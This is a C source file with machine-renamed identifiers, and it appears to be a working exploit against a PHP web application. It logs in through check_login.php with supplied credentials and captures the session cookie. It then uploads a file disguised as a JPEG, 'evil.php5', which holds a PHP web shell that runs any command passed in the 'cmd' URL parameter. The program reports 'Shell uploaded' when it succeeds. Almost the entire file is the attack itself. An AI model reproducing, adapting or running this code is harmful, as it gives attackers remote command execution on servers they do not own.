
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct option {char* member_0; int member_1; int member_3; int member_2; } ;


 int FUNC_0 (char*) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*) ;
 int FUNC_3 (int,char**,char*,struct option*,int*) ;
 char* VAR_0 ;
 int FUNC_4 (char*) ;
 scalar_t__ FUNC_5 (int,char*,int,int ) ;
 int FUNC_6 (char*,int) ;
 char* FUNC_7 (int,int) ;
 int FUNC_8 (char*) ;
 char* FUNC_9 (char*,char*) ;
 char* FUNC_10 (char*,char*) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (char**,char*,char*,char*,...) ;

int FUNC_13(int VAR_1, char *VAR_2[]) {

 int VAR_3,
     VAR_4,
     VAR_5,
     VAR_6 = 80,
     VAR_7,
     VAR_8;
 char *VAR_9 = ((void*)0),
   *VAR_10 = ((void*)0),
   *VAR_11 = ((void*)0),
   *VAR_12 = ((void*)0),
   *VAR_13 = ((void*)0),
   *VAR_14 = ((void*)0),
   *VAR_15 = ((void*)0),
   VAR_16[] = "--AaB03x\r\n"
      "Content-Disposition: form-data; name=\"photo\"; filename=\"evil.php5\"\r\n"
      "Content-Type: image/jpeg\r\n"
         "\r\n"
      "<?php echo \"<pre>\"; system($_GET[cmd]); echo \"</pre>\"?>\r\n"
      "--AaB03x\r\n"

      "Content-Disposition: form-data; name=\"Call\"\r\n"
      "\r\n"
      "add\r\n"
      "--AaB03x\r\n"

      "Content-Disposition: form-data; name=\"photoType\"\r\n"
      "\r\n"
      "P\r\n"
      "--AaB03x\r\n"

      "Content-Disposition: form-data; name=\"image.x\"\r\n"
      "\r\n"
      "8\r\n"
      "--AaB03x\r\n"

      "Content-Disposition: form-data; name=\"image.y\"\r\n"
      "\r\n"
      "5\r\n"
      "--AaB03x--\r\n";

 struct option VAR_17[] = {
  {"host", 1, 0, 1 },
        {"port", 1, 0, 2 },
  {"path", 1, 0, 3 },
        {"username", 1, 0, 'u'},
        {"password", 1, 0, 'p'},
        {((void*)0), 0, 0, 0 },
 };

 if(VAR_1 < 2) {
  FUNC_11(VAR_2[0]);
  return -1;
 }

 while((VAR_4 = FUNC_3(VAR_1, VAR_2, "u:p:", VAR_17, &VAR_5)) > 0) {

  switch(VAR_4) {

   case 1:
    VAR_12 = VAR_0;
   break;

   case 2:
    VAR_6 = FUNC_0(VAR_0);
   break;

   case 3:
    VAR_13 = VAR_0;
   break;

   case 'u':
    VAR_14 = VAR_0;
   break;

   case 'p':
    VAR_15 = VAR_0;
   break;

   default:
    FUNC_11(VAR_2[0]);
    return -1;
   break;

  }

 }

 if(!VAR_12 || !VAR_13 || !VAR_14 || !VAR_15 || VAR_6 < 0) {
  FUNC_11(VAR_2[0]);
  return -1;
 }

 FUNC_4("\n[*] Connecting...\n");

 if((VAR_3 = FUNC_6(VAR_12, VAR_6)) < 0) {
  FUNC_4("[-] Connection failed!\n\n");
  FUNC_2(VAR_9);
  return -1;
 }

 FUNC_4("[+] Connected"
        "\n[*] Login...");

 VAR_7 = FUNC_8(VAR_14)+FUNC_8(VAR_15)+16;

 VAR_8 = FUNC_12(&VAR_9, "POST %scheck_login.php HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: %d\r\n"
                        "\r\n"
                        "email=%s&password=%s", VAR_13, VAR_12, VAR_7, VAR_14, VAR_15);

 if(FUNC_5(VAR_3, VAR_9, VAR_8, 0) < 0) {
  FUNC_4("[-] Sending failed!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 if(!(VAR_10 = FUNC_7(VAR_3, 0))) {
  FUNC_4("[-] Receive failed!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 if(FUNC_9(VAR_10, "Password is invalid")) {
  FUNC_4("\n[-] Login Incorrect!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 VAR_11 = FUNC_9(VAR_10, "PHPSESSID");

 if(!VAR_11) {
  FUNC_4("\n[-] Session error!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 VAR_11 = FUNC_10(VAR_11, ";");

 if(!VAR_11) {
  FUNC_4("\n[-] Session error!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 FUNC_4("\n[+] Login Successful"
   "\n[*] Uploading...\n");

 FUNC_1(VAR_3);
 if((VAR_3 = FUNC_6(VAR_12, VAR_6)) < 0) {
  FUNC_4("[-] Connection failed!\n\n");
  FUNC_2(VAR_9);
  return -1;
 }

 FUNC_2(VAR_9);
 VAR_7 = FUNC_8(VAR_16);

 VAR_8 = FUNC_12(&VAR_9, "POST %spopups/photos.php HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Cookie: %s\r\n"
            "Content-type: multipart/form-data, boundary=AaB03x\r\n"
            "Content-Length: %d\r\n"
            "\r\n"
            "%s", VAR_13, VAR_12, VAR_11, VAR_7, VAR_16);

 if(FUNC_5(VAR_3, VAR_9, VAR_8, 0) < 0) {
  FUNC_4("[-] Sending failed!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 if(!(VAR_10 = FUNC_7(VAR_3, 3))) {
  FUNC_4("[-] Receive failed!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 if(!FUNC_9(VAR_10, "evil.php5")) {
  FUNC_4("\n[-] Upload failed!\n\n");
  FUNC_2(VAR_9);
  FUNC_1(VAR_3);
  return -1;
 }

 FUNC_2(VAR_9);
 FUNC_1(VAR_3);

 FUNC_4("[+] Shell uploaded"
   "\n[+] Connection closed\n\n");

 return 0;

}
